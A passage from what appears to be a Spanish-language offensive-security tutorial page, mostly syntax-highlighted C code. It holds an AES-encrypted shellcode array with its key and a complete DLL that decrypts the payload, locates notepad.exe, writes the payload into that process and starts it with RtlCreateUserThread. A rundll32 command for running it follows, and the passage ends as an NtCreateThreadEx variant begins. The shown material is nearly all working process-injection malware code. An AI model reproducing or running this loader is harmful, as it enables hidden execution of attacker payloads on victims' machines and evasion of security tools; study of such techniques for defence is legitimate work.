class="mh">0x19</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0xa7</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x8f</span> <span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>
<span class="kt">char</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xc3</span> <span class="p">};</span>

<span class="c1">// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_CLIENT_ID</span> <span class="p">{</span>
	<span class="n">HANDLE</span> <span class="n">UniqueProcess</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">UniqueThread</span><span class="p">;</span>
<span class="p">}</span> <span class="n">CLIENT_ID</span><span class="p">,</span> <span class="o">*</span><span class="n">PCLIENT_ID</span><span class="p">;</span>

<span class="k">typedef</span> <span class="nf">LPVOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">VirtualAlloc_t</span><span class="p">)(</span>
	<span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
	<span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
	<span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span>
	<span class="n">DWORD</span>  <span class="n">flProtect</span><span class="p">);</span>
	
<span class="k">typedef</span> <span class="nf">VOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">RtlMoveMemory_t</span><span class="p">)(</span>
	<span class="n">VOID</span> <span class="n">UNALIGNED</span> <span class="o">*</span><span class="n">Destination</span><span class="p">,</span> 
	<span class="k">const</span> <span class="n">VOID</span> <span class="n">UNALIGNED</span> <span class="o">*</span><span class="n">Source</span><span class="p">,</span> 
	<span class="n">SIZE_T</span> <span class="n">Length</span><span class="p">);</span>

<span class="k">typedef</span> <span class="nf">FARPROC</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">RtlCreateUserThread_t</span><span class="p">)(</span>
	<span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PSECURITY_DESCRIPTOR</span> <span class="n">SecurityDescriptor</span> <span class="n">OPTIONAL</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">BOOLEAN</span> <span class="n">CreateSuspended</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">StackZeroBits</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">OUT</span> <span class="n">PULONG</span> <span class="n">StackReserved</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">OUT</span> <span class="n">PULONG</span> <span class="n">StackCommit</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">StartAddress</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">StartParameter</span> <span class="n">OPTIONAL</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PHANDLE</span> <span class="n">ThreadHandle</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PCLIENT_ID</span> <span class="n">ClientId</span><span class="p">);</span>

<span class="k">typedef</span> <span class="nf">NTSTATUS</span> <span class="p">(</span><span class="n">NTAPI</span> <span class="o">*</span> <span class="n">NtCreateThreadEx_t</span><span class="p">)(</span>
	<span class="n">OUT</span> <span class="n">PHANDLE</span> <span class="n">hThread</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ACCESS_MASK</span> <span class="n">DesiredAccess</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">ObjectAttributes</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">lpStartAddress</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">lpParameter</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">StackZeroBits</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">SizeOfStackCommit</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">SizeOfStackReserve</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PVOID</span> <span class="n">lpBytesBuffer</span><span class="p">);</span>


<span class="k">extern</span> <span class="s">"C"</span> <span class="p">{</span>

<span class="kt">int</span> <span class="n">AESDecrypt</span><span class="p">(</span><span class="n">byte</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">keylen</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">HCRYPTPROV</span> <span class="n">hProv</span><span class="p">;</span>
        <span class="n">HCRYPTHASH</span> <span class="n">hHash</span><span class="p">;</span>
        <span class="n">HCRYPTKEY</span> <span class="n">hKey</span><span class="p">;</span>
		<span class="n">DWORD</span> <span class="o">*</span> <span class="n">pointer_len</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">payload_len</span><span class="p">;</span> 
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptAcquireContextW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hProv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PROV_RSA_AES</span><span class="p">,</span> <span class="n">CRYPT_VERIFYCONTEXT</span><span class="p">)){</span>
                <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptCreateHash</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_SHA_256</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hHash</span><span class="p">)){</span>
                <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptHashData</span><span class="p">(</span><span class="n">hHash</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">key</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">keylen</span><span class="p">,</span> <span class="mi">0</span><span class="p">)){</span>
                <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>              
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDeriveKey</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_AES_256</span><span class="p">,</span> <span class="n">hHash</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">hKey</span><span class="p">)){</span>
                <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDecrypt</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="p">(</span><span class="n">HCRYPTHASH</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">pointer_len</span><span class="p">)){</span>
                <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">CryptReleaseContext</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">CryptDestroyHash</span><span class="p">(</span><span class="n">hHash</span><span class="p">);</span>
        <span class="n">CryptDestroyKey</span><span class="p">(</span><span class="n">hKey</span><span class="p">);</span>  
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="n">FindProcess</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">procname</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">HANDLE</span> <span class="n">hProcSnap</span><span class="p">;</span>
        <span class="n">PROCESSENTRY32</span> <span class="n">pe32</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">hProcSnap</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span><span class="c1">//se crear un snapshot de los procesos en ejecución del sistema operativo</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span> <span class="o">==</span> <span class="n">hProcSnap</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
                
        <span class="n">pe32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span> <span class="c1">// se obtiene el tamaño total del objeo definido</span>
                
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Process32First</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// validación del snapshot creado</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
                
        <span class="k">while</span> <span class="p">(</span><span class="n">Process32Next</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// iteración del snapshot</span>
				<span class="n">printf</span><span class="p">(</span><span class="s">"[FindProcess: ] %s </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">lstrcmpiA</span><span class="p">(</span><span class="n">procname</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// comprobación del nombre del proceso</span>
                        <span class="n">pid</span> <span class="o">=</span> <span class="n">pe32</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span> <span class="c1">// obtención del pid del proceso</span>
						<span class="n">printf</span><span class="p">(</span><span class="s">"Process Found!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                        <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
                
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">);</span> <span class="c1">//se cierra el snapshot</span>
                
        <span class="k">return</span> <span class="n">pid</span><span class="p">;</span> <span class="c1">// retorno de pid</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="n">Inject</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hProc</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">)</span> <span class="p">{</span>

	<span class="n">LPVOID</span> <span class="n">pRemoteCode</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">CLIENT_ID</span> <span class="n">cid</span><span class="p">;</span>
	<span class="c1">// Inyeccion tipo2 pRtlCreateUserThread</span>
	<span class="n">RtlCreateUserThread_t</span> <span class="n">pRtlCreateUserThread</span> <span class="o">=</span> <span class="p">(</span><span class="n">RtlCreateUserThread_t</span><span class="p">)</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"NTDLL.DLL"</span><span class="p">),</span> <span class="s">"RtlCreateUserThread"</span><span class="p">);</span>
	<span class="n">AESDecrypt</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
	<span class="n">pRemoteCode</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">);</span>
	<span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="n">pRemoteCode</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span> <span class="o">*</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="c1">// Inyeccion tipo2 pRtlCreateUserThread</span>
	<span class="n">pRtlCreateUserThread</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pRemoteCode</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cid</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">hThread</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="mi">500</span><span class="p">);</span>
			<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>
			<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
	
<span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="n">f0ns1</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>	
	<span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">hProc</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">pid</span> <span class="o">=</span> <span class="n">FindProcess</span><span class="p">(</span><span class="s">"notepad.exe"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"Notepad.exe PID = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
		<span class="n">hProc</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span> <span class="n">PROCESS_CREATE_THREAD</span> <span class="o">|</span> <span class="n">PROCESS_QUERY_INFORMATION</span> <span class="o">|</span> 
						<span class="n">PROCESS_VM_OPERATION</span> <span class="o">|</span> <span class="n">PROCESS_VM_READ</span> <span class="o">|</span> <span class="n">PROCESS_VM_WRITE</span><span class="p">,</span>
						<span class="n">FALSE</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span> <span class="n">pid</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">hProc</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">Inject</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
			<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProc</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">}</span>

<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>  <span class="n">DWORD</span>  <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>  <span class="p">{</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>ejecución:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32.exe external_injection_dll_2.dll,f0ns1
</code></pre></div></div>

<h4 id="dll-pntcreatethreadex">Dll pNtCreateThreadEx()</h4>

<p>Código asociado al binario:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;winternl.h&gt;</span><span class="cp">
